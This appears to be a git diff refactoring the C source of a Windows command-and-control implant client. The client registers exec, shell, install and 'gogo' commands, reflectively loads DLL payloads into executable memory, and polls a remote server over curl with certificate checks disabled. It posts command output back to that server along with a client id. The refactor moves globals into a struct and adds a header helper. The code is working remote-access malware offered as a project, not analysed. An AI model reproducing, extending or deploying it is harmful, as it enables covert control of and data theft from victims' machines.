@@ -1,60 +1,12 @@
 // cl.exe /LD /MD main.c gadget_loader.c /Fo.\obj\ /O2 /Ot /GL
 
-#include "common.h"
-#include <string.h>
-#include <Windows.h>
+#include "main.h"
 
-#include "commandlist.h"
-#include "base64.h"
+CommandStruct clientinfo;
 
-#define CURL_STATICLIB
-#include "tinycurl\include\curl\curl.h"
-
-// Library for MessageBox
-#pragma comment(lib, "user32.lib")
-
-// Libraries needed for tinycurl
-#pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "crypt32.lib")
-#pragma comment(lib, "normaliz.lib")
-#pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "wldap32.lib")
-#pragma comment(lib, "tinycurl\\lib\\libcurl_a.lib")
-
-// Function declarations
-int   main(void);
-void  jitter_connect(void);
-void  command_loop(void);
-char* execute_command(const char *cmd);
-void  update_curl_headers(void);
-__declspec(dllexport) void MainExport(void);
-// Built-in functions
-char* CMD_exec(char* args);
-char* CMD_shell(char* args);
-char* CMD_gogo(char* args);
-char* CMD_quit(char* args);
-char* CMD_install(char* args);
-
-// This is the list of available commands the client can run
-CommandNode* commandList = NULL;
-
-// Global used to store response sent back to the server
-// For example: recv: `exec ls`; STORED_RESPONSE: ".bashrc myfile.txt etc..."
-char* STORED_RESPONSE = NULL;
-
-// Commands header info
-char* COMMANDS_HEADER = "Commands: ";   // This is the header for commandsList
-char* AVAILABLE_COMMANDS = NULL;        // This sends commandsList to the server
-
-// Clientid header info
-char* CLIENTID = "clientid: 10"; // TODO: It needs to be generated on the client, not static
-
-// Sent back to the server, tells it what command the results are for
-// For `exec` calls, will be the command like "ls" or "dir"
-char* CURRENT_COMMAND = NULL;
-
-// This is the linked list of headers supplied to curl
-struct curl_slist *CLIENT_HEADERS = NULL;
+char* HEADER_KEY_COMMAND  = "command: ";
+char* HEADER_KEY_COMMANDS = "Commands: ";
+char* HEADER_KEY_CLIENTID = "clientid: ";
 
 // Built-in Commands
 char* CMD_exec(char* args)
@@ -79,13 +31,17 @@ char* CMD_gogo(char* args)
     HANDLE hModule  = NULL;
 
     if (gadget == NULL)
+    {
         return NULL;
+    }
     
     debugf("gadget: %p", gadget);
     debugf("gadget length: %zu\n", gadget_len);
     lpBuffer = VirtualAlloc(NULL, gadget_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if( !lpBuffer )
+    {
 		BREAK_WITH_ERROR( "Failed to allocate space" );
+    }
 
     memcpy(lpBuffer, gadget, gadget_len);
     debugf("memcpy\n");
@@ -94,14 +50,16 @@ char* CMD_gogo(char* args)
     CommandNodePointer func;
     hModule = (HANDLE)ReflectiveLoader( lpBuffer, &func );
 	if( !hModule )
+    {
 		BREAK_WITH_ERROR( "Failed to inject the DLL" );
+    }
     
     CommandNode* tester = func();
     debugf("Tester: %s\n", tester->command);
 
-    insertCommandNode(&commandList, createCommandNode(tester->command, tester->function));
-    if (AVAILABLE_COMMANDS) {free(AVAILABLE_COMMANDS); AVAILABLE_COMMANDS=NULL;}
-    AVAILABLE_COMMANDS = getCommands(commandList, COMMANDS_HEADER);
+    insertCommandNode(&clientinfo.commandList, createCommandNode(tester->command, tester->function));
+    SAFE_FREE(clientinfo.data_commands);
+    clientinfo.data_commands = getCommands(clientinfo.commandList, NULL);
     update_curl_headers();
 
     debugf("Inserted command!\n");
@@ -140,37 +98,48 @@ void check_response(char* data)
     char *command = data;
     char *arguments = space_pos + 1;
 
-    CommandNode* commandnode = findCommandNode(commandList, command);
+    CommandNode* commandnode = findCommandNode(clientinfo.commandList, command);
 
     if (commandnode != NULL)
     {
         if (!strcmp(commandnode->command, "exec"))
         {
-            CURRENT_COMMAND = strdup(arguments);
+            clientinfo.data_command = strdup(arguments);
         }
         else
         {
-            CURRENT_COMMAND = strdup(commandnode->command);
+            clientinfo.data_command = strdup(commandnode->command);
         }
-        STORED_RESPONSE = commandnode->function(arguments);
+        clientinfo.data_response = commandnode->function(arguments);
     }
 }
 
 int main(void)
 {
+    // Initialize the CommandStruct
+    clientinfo.commandList     = NULL;
+    clientinfo.header_command  = HEADER_KEY_COMMAND;
+    clientinfo.header_commands = HEADER_KEY_COMMANDS;
+    clientinfo.header_clientid = HEADER_KEY_CLIENTID;
+    clientinfo.data_command   = NULL;
+    clientinfo.data_commands   = NULL;
+    clientinfo.data_clientid   = "10"; // TODO: Not static
+    clientinfo.data_response   = NULL;
+    clientinfo.client_headers  = NULL;
+
     // Initialize curl
     curl_global_init(CURL_GLOBAL_DEFAULT);
 
     // Initialize built-in commands
-    insertCommandNode(&commandList, createCommandNode("exec", CMD_exec));
-    insertCommandNode(&commandList, createCommandNode("shell", CMD_shell));
-    insertCommandNode(&commandList, createCommandNode("gogo", CMD_gogo));
-    insertCommandNode(&commandList, createCommandNode("quit", CMD_quit));
-    insertCommandNode(&commandList, createCommandNode("install", CMD_install));
+    insertCommandNode(&clientinfo.commandList, createCommandNode("exec", CMD_exec));
+    insertCommandNode(&clientinfo.commandList, createCommandNode("shell", CMD_shell));
+    insertCommandNode(&clientinfo.commandList, createCommandNode("gogo", CMD_gogo));
+    insertCommandNode(&clientinfo.commandList, createCommandNode("quit", CMD_quit));
+    insertCommandNode(&clientinfo.commandList, createCommandNode("install", CMD_install));
 
     // Initialize available commands that the server returns; updated in `gogo` command
     debugf("Getting commands\n");
-    AVAILABLE_COMMANDS = getCommands(commandList, COMMANDS_HEADER);
+    clientinfo.data_commands = getCommands(clientinfo.commandList, NULL);
     update_curl_headers();
 
     // Start C2
@@ -216,23 +185,52 @@ size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata)
     return realsize;
 }
 
-// Utilizes numerous globals. Potential TODO: Single struct?
 void update_curl_headers(void)
 {
-    if (CLIENT_HEADERS)
+    // Dump exising headers
+    if (clientinfo.client_headers)
     {
-        curl_slist_free_all(CLIENT_HEADERS);
+        curl_slist_free_all(clientinfo.client_headers);
     }
-    CLIENT_HEADERS = curl_slist_append(NULL, CLIENTID);
-    curl_slist_append(CLIENT_HEADERS, AVAILABLE_COMMANDS); // return ignored
-    if (CURRENT_COMMAND)
+
+    // Create a new header list
+    char* clientid = make_header(clientinfo.header_clientid, clientinfo.data_clientid);
+    char* commands = make_header(clientinfo.header_commands, clientinfo.data_commands);
+    debugf("commands: %s\n", commands);
+    clientinfo.client_headers = curl_slist_append(NULL, clientid);
+    curl_slist_append(clientinfo.client_headers, commands);
+
+    debugf("Added first two headers.\n");
+    // curl append `strdup`s the data, so free our buffers
+    SAFE_FREE(clientid);
+    SAFE_FREE(commands);
+
+    // Add command header (executed command)
+    if (clientinfo.data_command)
     {
-        char command_hdr[] = "command: ";
-        size_t buffer_size = strlen(CURRENT_COMMAND)+sizeof(command_hdr) + 1;
-        char* command_buffer = calloc(buffer_size, 1);
-        snprintf(command_buffer, buffer_size, "%s%s", command_hdr, CURRENT_COMMAND);
-        curl_slist_append(CLIENT_HEADERS, command_buffer);
+        char* command = make_header(clientinfo.header_command, clientinfo.data_command);
+        curl_slist_append(clientinfo.client_headers, command);
+        SAFE_FREE(command);
     }
+    debugf("End of update headers.\n");
+}
+
+char* make_header(const char* header, const char* data)
+{
+    size_t buffer_len = strlen(header) + strlen(data) + 2;
+    char* buffer = calloc(buffer_len, sizeof(char));
+    if (!buffer)
+    {
+        return NULL;
+    }
+    if (snprintf(buffer, buffer_len, "%s%s", header, data) < 0)
+    {
+        return NULL;
+    }
+    debugf("Make header, header: %s\n", header);
+    debugf("Make header, data: %s\n", data);
+    debugf("Make header, buffer: %s\n", buffer);
+    return buffer;
 }
 
 void command_loop(void)
@@ -262,12 +260,12 @@ void command_loop(void)
         curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errbuf);
         errbuf[0] = 0;
 
-        // If STORED_RESPONSE is not NULL, we have data to send to the server
-        if (STORED_RESPONSE != NULL)
+        // If clientinfo.data_response is not NULL, we have data to send to the server
+        if (clientinfo.data_response != NULL)
         {
-            debugf("sending response: %s\n", STORED_RESPONSE);
+            debugf("sending response: %s\n", clientinfo.data_response);
             // Does not create a copy of data, so mark that it needs to be free'd
-            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, STORED_RESPONSE);
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, clientinfo.data_response);
             free_response = 1;
             // Update headers with current command
             update_curl_headers();
@@ -280,7 +278,7 @@ void command_loop(void)
         }
 
         // Set headers
-        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, CLIENT_HEADERS);
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, clientinfo.client_headers);
 
         // Disable SSL certificate verification
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
@@ -298,11 +296,9 @@ void command_loop(void)
         // This happens here before we check the `current` response from server
         if (free_response)
         {
-            free(STORED_RESPONSE);
-            free(CURRENT_COMMAND);
+            SAFE_FREE(clientinfo.data_response);
+            SAFE_FREE(clientinfo.data_command);
             free_response = 0;
-            STORED_RESPONSE = NULL;
-            CURRENT_COMMAND = NULL;
             update_curl_headers();
         }
 
@@ -336,7 +332,7 @@ void command_loop(void)
         curl_easy_cleanup(curl);
     }
     debugf("Freeing stuff.\n");
-    if (chunk.memory)  {free(chunk.memory);}
+    SAFE_FREE(chunk.memory);
     debugf("Done with loop\n");
 }
 
